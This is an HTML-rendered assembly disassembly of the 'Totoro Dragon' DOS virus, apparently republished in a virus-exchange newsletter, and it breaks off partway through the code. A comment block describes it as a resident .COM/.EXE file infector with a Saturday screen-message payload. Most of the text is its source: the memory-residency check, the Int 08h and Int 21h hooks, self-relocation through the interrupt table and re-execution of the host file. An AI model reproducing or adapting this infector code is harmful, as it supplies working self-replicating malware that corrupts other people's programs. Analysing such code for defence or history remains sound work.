<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>TOTORO.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;TOTORO DRAGON disassembly.  Included, for your pleasure, in Crypt</span><span class="sc0">
</span><span class="sc1">;Newsletter 14.  Profuse thanks to Stormbringer, wherever he is.</span><span class="sc0">

</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;*       The Totoro Dragon Virus from Taiwan             *</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;*    This virus is a fairly simple resident .EXE/.COM infector.  It goes  *</span><span class="sc0">
</span><span class="sc1">;*resident by re-executing the infected file and using Int 21, function 31.*</span><span class="sc0">
</span><span class="sc1">;*When it infects a .COM, it puts itself at the beginning of the file and  *</span><span class="sc0">
</span><span class="sc1">;*starts the host at an offset of 600h (700h in memory), giving the virus  *</span><span class="sc0">
</span><span class="sc1">;*an effective length of 1536 bytes, plus an extra 4 bytes for its marker  *</span><span class="sc0">
</span><span class="sc1">;*at the end ("YTIT").  It infects .EXE files using the "standard" method. *</span><span class="sc0">
</span><span class="sc1">;*While it does save file attributes, the time and date change when a file *</span><span class="sc0">
</span><span class="sc1">;*is infected.  The virus activates on Saturdays.  When active, it installs*</span><span class="sc0">
</span><span class="sc1">;*an Int 08 (Timer click) handler that counts to  0CCCh, then shoves the   *</span><span class="sc0">
</span><span class="sc1">;*text off the screen and prints the following in the upper left-hand      *</span><span class="sc0">
</span><span class="sc1">;*corner:                                 *</span><span class="sc0">
</span><span class="sc1">;*                                   *</span><span class="sc0">
</span><span class="sc1">;*          ÖÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ·             *</span><span class="sc0">
</span><span class="sc1">;*          º    Totoro  Dragon    º             *</span><span class="sc0">
</span><span class="sc1">;*          ºHello! I am TOTORO CATº             *</span><span class="sc0">
</span><span class="sc1">;*          º Written by Y.T.J.C.T º             *</span><span class="sc0">
</span><span class="sc1">;*          º in Ping Tung. TAIWAN º             *</span><span class="sc0">
</span><span class="sc1">;*          º Don't Worry,be Happy º             *</span><span class="sc0">
</span><span class="sc1">;*          ÓÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ½             *</span><span class="sc0">
</span><span class="sc1">;*                                   *</span><span class="sc0">
</span><span class="sc1">;*It then restarts the counter and does it again.  Other that this effect, *</span><span class="sc0">
</span><span class="sc1">;*the virus seems relatively harmless.                   *</span><span class="sc0">
</span><span class="sc1">;*                                   *</span><span class="sc0">
</span><span class="sc1">;*                                   *</span><span class="sc0">
</span><span class="sc1">;*          Disassembly by Stormbringer           *</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.radix</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">COM_Entry_Point</span><span class="sc0">
        </span><span class="sc6">nop</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc1">;*                Data Tables               *</span><span class="sc0">
</span><span class="sc1">;***************************************************************************</span><span class="sc0">
</span><span class="sc5">File_Size_Off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">File_Size_Seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">TSR_DAT</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">4262h</span><span class="sc0">
</span><span class="sc5">DS_Save</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F21h</span><span class="sc0">
</span><span class="sc5">ES_Save</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F21h</span><span class="sc0">
</span><span class="sc5">File_Attribs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc5">IP_Save</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CS_Save</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F99</span><span class="sc0">
</span><span class="sc5">SP_Save</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SS_Save</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">File_Type</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'C'</span><span class="sc0">

</span><span class="sc5">Wasted_Space</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;?</span><span class="sc0">

</span><span class="sc1">;********************************************</span><span class="sc0">
</span><span class="sc1">;       EXE_Header       ;</span><span class="sc0">
</span><span class="sc1">;********************************************</span><span class="sc0">
    </span><span class="sc5">EXE_Sig</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'MZ'</span><span class="sc0">
    </span><span class="sc5">Last_Page_Len</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">14h</span><span class="sc0">
    </span><span class="sc5">EXE_Size</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">
    </span><span class="sc5">Rel_Tbl_Items</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Header_Size</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">20h</span><span class="sc0">
    </span><span class="sc5">Minalloc</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Maxalloc</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0ffff</span><span class="sc0">
    </span><span class="sc5">Init_SS</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">Init_SP</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">700h</span><span class="sc0">
    </span><span class="sc5">Checksum</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Init_IP</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">91h</span><span class="sc0">
    </span><span class="sc5">Init_CS</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc5">First_Rel</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">001Eh</span><span class="sc0">
    </span><span class="sc5">Overlay_Num</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc1">;********************************************</span><span class="sc0">

</span><span class="sc5">CS_Store</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Command</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'COMMAND.COM'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">ES_Store_1</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F21h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5Ch</span><span class="sc0">
</span><span class="sc5">ES_Store_2</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F21h</span><span class="sc0">
        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">6Ch</span><span class="sc0">
</span><span class="sc5">ES_Store_3</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F21h</span><span class="sc0">
</span><span class="sc5">File_Handle</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">5</span><span class="sc0">

</span><span class="sc5">Buffer_For_Checks</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
              </span><span class="sc9">db</span><span class="sc0">       </span><span class="sc2">4Ch</span><span class="sc4">,</span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">File_Name_Off</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">469h</span><span class="sc0">
</span><span class="sc5">File_Name_Seg</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0DF5h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Mem_Seg</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0F93h</span><span class="sc0">
</span><span class="sc5">IP_24</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">156h</span><span class="sc0">
</span><span class="sc5">CS_24</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0DF5h</span><span class="sc0">

</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc1">;*           Virus Entry Point #1 (COM)            *</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc5">COM_Entry_Point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F1F1h</span><span class="sc0">       </span><span class="sc1">;Is the virus in memory?</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">CS_Store</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Save</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F1F1h</span><span class="sc0">     </span><span class="sc1">;AX preserved?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Already_Installed</span><span class="sc0">  </span><span class="sc1">;Same? go Already_Installed</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Install_Virus</span><span class="sc0">      </span><span class="sc1">;Not In Mem? go Install_Virus</span><span class="sc0">

</span><span class="sc5">Already_Installed</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;Restore control to host file (COM)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">;ES = DS = CS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0CBh</span><span class="sc0">      </span><span class="sc1">;Restore Control</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">700h</span><span class="sc0">      </span><span class="sc1">;Offset of host in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">      </span><span class="sc1">;Original offset of host</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">File_Size_Off</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Size of host file</span><span class="sc0">

        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0"> </span><span class="sc1">;Call internal routine to restore control</span><span class="sc0">
                   </span><span class="sc1">;to host .COM file.</span><span class="sc0">

</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc1">;*           Virus Entry Point #2 (EXE)            *</span><span class="sc0">
</span><span class="sc1">;************************************************************************</span><span class="sc0">
</span><span class="sc5">EXE_Entry_Point</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">After_Jump</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                </span><span class="sc1">;Jump to After_Jump with</span><span class="sc0">
                        </span><span class="sc1">;original .COM offsets.</span><span class="sc0">
</span><span class="sc5">After_Jump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Save</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">DS_Save</span><span class="sc4">],</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F1F1h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0F1F1h</span><span class="sc0">          </span><span class="sc1">;Check if installed.</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Get_New_Seg</span><span class="sc0">      </span><span class="sc1">;Nope, Install....</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SS_Save</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;Yes, restore host regs</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">SP_Save</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sti</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_Store</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_Save</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_Save</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;Restore Control to</span><span class="sc0">
                            </span><span class="sc1">;.EXE host.</span><span class="sc0">

</span><span class="sc5">Get_New_Seg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">;For later RETF</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">            </span><span class="sc1">;DS = 0</span><span class="sc0">

</span><span class="sc1">;****************************************************************************</span><span class="sc0">
</span><span class="sc1">;*NOTE: From 0:200 to 0:400 there is some "empty" space, as it is the upper *</span><span class="sc0">
</span><span class="sc1">;*      (unused) part of the interrupt tables. This virus uses the top three*</span><span class="sc0">
</span><span class="sc1">;*      bytes, i.e. the INT 99 entry, to run a repnz movsb command followed *</span><span class="sc0">
</span><span class="sc1">;*      by a retf.  This is to copy the virus to a new segment in memory and*</span><span class="sc0">
</span><span class="sc1">;*      jump to it.                          *</span><span class="sc0">
</span><span class="sc1">;****************************************************************************</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3fdh</span><span class="sc4">],</span><span class="sc2">0A4F3h</span><span class="sc0"> </span><span class="sc1">;repnz movsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">3ffh</span><span class="sc4">],</span><span class="sc2">0CBh</span><span class="sc0">   </span><span class="sc1">;retf</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">            </span><span class="sc1">;Copy virus to new segment</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">600h</span><span class="sc0">        </span><span class="sc1">;and "RETF" to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Install_Virus</span><span class="sc0">   </span><span class="sc1">;Install_Virus in new copy</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc4">,</span><span class="sc2">0FDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">03h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">  </span><span class="sc1">;Jump far 0:3FDh</span><span class="sc0">

</span><span class="sc5">Install_Virus</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cli</span><span class="sc0">              </span><span class="sc1">;Disable interrupts</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Get Day/Date</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">            </span><span class="sc1">;Is it Saturday?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">Set_Int_21</span><span class="sc0">        </span><span class="sc1">;Nope, don't activate, just</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3508h</span><span class="sc0">        </span><span class="sc1">;infect files.</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Get Int 08 address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_08</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_08</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int_08</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2508h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Set Int 08</span><span class="sc0">

</span><span class="sc5">Set_Int_21</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Get Int 21 address</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">IP_21</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">CS_21</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Int_21</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">2521h</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Set Int_21</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Save</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">TSR_DAT</span><span class="sc4">],</span><span class="sc2">426Bh</span><span class="sc0">      </span><span class="sc1">;Second Execute?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">Go_TSR</span><span class="sc0">        </span><span class="sc1">;Yep, go TSR</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">        </span><span class="sc1">;Nope, set up for second exec.</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Ah</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">          </span><span class="sc1">;Change Mem Allocation</span><span class="sc0">
                        </span><span class="sc1">;to 64k.</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;Environment string</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">7FFFh</span><span class="sc0">

</span><span class="sc5">Find_Filename</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;Search Environment for</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0">   </span><span class="sc6">scasb</span><span class="sc0">          </span><span class="sc1">;filename of host.</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">loopnz</span><span class="sc0">  </span><span class="sc5">Find_Filename</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">            </span><span class="sc1">;Skip drive designator</span><span class="sc0">
                        </span><span class="sc1">;i.e. "C:\" in</span><span class="sc0">
                        </span><span class="sc1">;"C:\Infected.EXE"</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">            </span><span class="sc1">;DS:DX = host filename</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

        </span><span class="sc6">cli</span><span class="sc0">              </span><span class="sc1">;Clears Ints (so none can</span><span class="sc0">
                        </span><span class="sc1">;disrupt second execution</span><span class="sc0">
                        </span><span class="sc1">;of virus)</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">ES_Save</span><span class="sc4">]</span><span class="sc0">
